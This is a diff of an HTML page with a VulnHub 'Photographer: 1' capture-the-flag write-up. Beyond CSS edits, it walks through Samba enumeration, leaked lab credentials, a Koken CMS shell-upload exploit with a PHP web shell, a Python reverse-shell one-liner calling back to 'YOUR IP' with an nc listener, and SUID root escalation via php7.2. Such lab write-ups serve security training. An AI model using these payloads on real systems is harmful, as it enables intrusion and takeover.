@@ -15,23 +15,11 @@
 
 body{
 background-color: rgba(0, 0, 0, 0.9);
+width: 95%;
 }
 
-li a{
+li a, p, h1, h2{
 color:#808080;
-}
-
-p{
-color: #808080;
-}
-
-h1{
-color: #808080;
-
-}
-
-h2 {
- color: #808080;
 }
 
 .tools h1 ,h2{
@@ -89,61 +77,12 @@ text-align:center;
   color: white;
 }
 
-@media screen and (max-width: 768px) {
-  .topnav a:not(:first-child){
-    display: none;
-  }
-  .topnav a.icon {
-    float: right;
-    display: block;
-  }
-}
-
-@media screen and (max-width: 768px) {
-  .topnav.responsive {position: relative;}
-  .topnav.responsive .icon {
-    position: absolute;
-    right: 0;
-    top: 0;
-  }
-  .topnav.responsive a {
-    float: none;
-    display: block;
-    text-align: left;
-  }
-}
-
-
-@media only screen and (max-width: 1024px) {
-
- .row{
- padding:absolute;
- }
- 
- .col-12 {
-   max-width: 100%;
- }
- 
- footer{
-  position: fixed;
-}
-
-.social{
-	position: fixed;
-	top: 20px;
-	left: 75%;
-}
-}
-
-	
-.gallery{
-}
-
 .gallery img {
   position: relative;
   float:center;
+  background-attachment: fixed;  
   box-shadow: 0 4px 8px 0 rgba(99, 173, 118, 0.2), 0 6px 20px 0 rgba(99, 173, 118, 0.9);
-  left: 1%;
+  left: 5%;
 }
 
 .desc {
@@ -155,30 +94,20 @@ text-align:center;
 
 pre {
 	background: rgba(0, 0, 0, 0.9);
-	border: 1px solid rgba(255, 255, 255, 0.15);
+	border: 10px outset rgba(27, 27, 30, 1);
 	padding: 10px;
 	font-size: 16px;
 	color: #aa759f;
 	border-radius: 2px;
 	text-wrap: normal;
 	overflow: auto;
-	overflow-y: hidden
+	overflow-y: hidden;
 }
 
-code.highlighter-rouge {
-	background: rgba(0, 0, 0, 0.9);
-	border: 1px solid rgba(255, 255, 255, 0.15);
-	padding: 0px 3px;
-	margin: 0px -3px;
-	color: #aa759f;
-	border-radius: 2px
-}
 
   </style>
 	</HEAD>
-	<BODY>	
-	<div class="row">
-		<div class="col-12">
+	<BODY>		
 		<nav class="navbar navbar-expand-lg">
 			<div class="topnav" id="myTopnav">
 				<a class="nav-link" href="../../index.html">Home <span class="sr-only">(current)</span></a>
@@ -188,18 +117,20 @@ code.highlighter-rouge {
 				<a href="javascript:void(0);" style="font-size:15px;" class="icon" onclick="myFunction()">&#9776;</a>
 			</div>					
 		</nav>
+		
          <header>
 		  <h1>Photographer: 1, Vulnhub Writeup</h1>
 		  <p>Posted by Alienum</p>
 		</header> 
+		
 		<div class="gallery">
 		  <p>
-		   <div class="desc">Port Scan</div><br>
+		   <div class="desc">Port Scan</div>
 		    <img src="source/1.PNG" style="width:500px; height: 500px;"> 
 		   </p>
 		   <p>
-		    <div class="desc">Samba</div><br>
-			<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight">smbclient -L $IP
+		    <div class="desc">Samba</div>
+			<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient -L $IP
 smbclient //$IP/sambashare
 get mailsent.txt
 get wordpress.bkp.zip</code></pre></div></div>
@@ -208,72 +139,71 @@ get wordpress.bkp.zip</code></pre></div></div>
 		   </p>
 		  <p>
 		    <div class="desc">Read the mailsent.txt</div><br>
-			<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight">username : daisa
+			<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>username : daisa
 password : babygirl</code></pre></div></div>
 		    <img src="source/3.PNG" style="width:600px; height: 360px;"> 
 		   </p>
 		    <p>
-		    <div class="desc">Directory scan</div><br>
-			<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight">dirb http://$TARGET:8000 -f</code></pre></div></div>
-		    <img src="source/5.PNG" style="width:500px; height: 50px;"><br>
-			<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight">Found /admin/</code></pre></div></div>
+		    <div class="desc">Directory scan</div>
+			<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dirb http://$TARGET:8000 -f</code></pre></div></div>
+		    <img src="source/5.PNG" style="width:500px; height: 50px;"><br><br>
+			<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Found /admin/</code></pre></div></div>
 		    <img src="source/51.PNG" style="width:600px; height: 100px;"><br>
 		   </p>
 		 <p>
-		    <div class="desc">Login </div><br>
-			<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight">email : daisa@photographer.com
-password : babygirl</code></pre></div></div>
-		    <img src="source/6.PNG" style="width:520px; height: 320px;"><br>
+		    <div class="desc">Login </div>
+			<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>email : daisa@photographer.com
+password : babygirl</code></pre></div></div><br>
+		    <img src="source/6.PNG" ><br>
 		  </p>
 		  <p>
-		   <div class="desc">Search for Koken 0.22.24 vulnerability</div>
-		    <img src="source/7.PNG" style="width:450px; height: 320px;"><br> 
-		    <div class="desc">Found : Koken CMS 0.22.24 Shell Upload</div><br>
-		    <img src="source/8.PNG" style="width:600px; height: 500px;"><br>
-		    <div class="desc">Create malicious jpg file</div><br>
-			<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight">system($_GET['cmd']);</code></pre></div></div>
-		    <img src="source/9.PNG" style="width:400px; height: 200px;"><br>
-		    <div class="desc">Upload the image.php.jpg</div><br>
-		    <img src="source/10.PNG" style="width:600px; height: 450px;"><br>
-			<div class="desc">Use Burpsuite to change the image.php.jpg => image.php</div><br>
-		    <img src="source/11.PNG" style="width:600px; height: 600px;">
-			<br>
-			<div class="desc">Move the cursor on the "Download File" to see the original path of the image.php</div><br>
+		    <div class="desc">Search for Koken 0.22.24 vulnerability</div>
+		    <img src="source/7.PNG" style="width:450px; height: 320px;"><br><br>
+		    <div class="desc">Found : Koken CMS 0.22.24 Shell Upload</div>
+		    <img src="source/8.PNG" style="width:600px; height: 500px;"><br><br>
+		    <div class="desc">Create malicious jpg file</div>
+			<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>system($_GET['cmd']);</code></pre></div></div>
+		    <img src="source/9.PNG" style="width:400px; height: 200px;"><br><br>
+		    <div class="desc">Upload the image.php.jpg</div>
+		    <img src="source/10.PNG" style="width:600px; height: 450px;"><br><br>
+			<div class="desc">Use Burpsuite to change the image.php.jpg => image.php</div>
+		    <img src="source/11.PNG" style="width:600px; height: 600px;"><br><br>
+			<div class="desc">Move the cursor on the "Download File" to see the original path of the image.php</div>
 		    <img src="source/12.PNG" style="width:600px; height: 450px;">
-			<br>
+			<br><br>
 			</p>
 			<p>
-		   <div class="desc">Reverse shell | We are able to execute commands.</div><br>
-		    <img src="source/13.PNG" style="width:800px; height: 320px;"><br> 
-		    <div class="desc">Python reverse shell</div><br>
+		    <div class="desc">Reverse shell | We are able to execute commands.</div>
+		    <img src="source/13.PNG" style="width:800px; height: 320px;"><br><br>
+		    <div class="desc">Python reverse shell</div>
 			<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><div class="desc">|Target machine|</div>image.php?cmd= python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
 s.connect(("YOUR IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);
 os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
-<div class="desc">|Your machine|</div>nc -lvp 4444</code></pre></div></div>
+            <div class="desc">|Your machine|</div>nc -lvp 4444</code></pre></div></div>
 			<br>
-		    <img src="source/14.PNG" style="width:800px; height: 400px;"><br>
-		    <div class="desc">Found the user.txt</div><br>
+		    <img src="source/14.PNG" style="width:800px; height: 400px;"><br><br>
+		    <div class="desc">Found the user.txt</div>
 			<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight">cd /home/daisa/
-cat user.txt</code></pre></div></div>
-		    <img src="source/15.PNG" style="width:600px; height: 300px;"><br>
+cat user.txt</code></pre></div></div><br>
+		    <img src="source/15.PNG" style="width:600px; height: 300px;"><br><br>
 			</p>
 			<p>
-		    <div class="desc">Root Privilege Escalation</div><br>
+		    <div class="desc">Root Privilege Escalation</div>
 			<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / -perm -u=s -type f 2>/dev/null</code></pre></div></div>
-			<div class="desc">I found the suspicious /usr/bin/php7.2</div><br>
-		    <img src="source/16.PNG" style="width:400px; height: 360px;"> <br>
-			<div class="desc">Let's search for GTFOBins php</div><br>
-			<img src="source/161.PNG" style="width:600px; height: 300px;"> <br>
-			<div class="desc">We found the SUID exploit, i will use the full path for php7.2</div><br>
+			<div class="desc">I found the suspicious /usr/bin/php7.2</div>
+		    <img src="source/16.PNG" style="width:400px; height: 360px;"> <br><br>
+			<div class="desc">Let's search for GTFOBins php</div>
+			<img src="source/161.PNG" style="width:600px; height: 300px;"><br><br>
+			<div class="desc">We found the SUID exploit, i will use the full path for php7.2</div>
 			<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight">
 CMD="/bin/sh"
-/usr/bin/php7.2 -r "pcntl_exec('/bin/sh', ['-p']);"
-</code></pre></div></div>
+/usr/bin/php7.2 -r "pcntl_exec('/bin/sh', ['-p']);"</code></pre></div></div><br>
 		    <img src="source/17.PNG" style="width:600px; height: 600px;"> 
-			<br>
+			<br><br>
 			<h2>Rooted</h2>
 		   </p>
 		</div> 
+		
 		<footer>
 			<div class="social">
 				<a  href="https://github.com/alienaki">
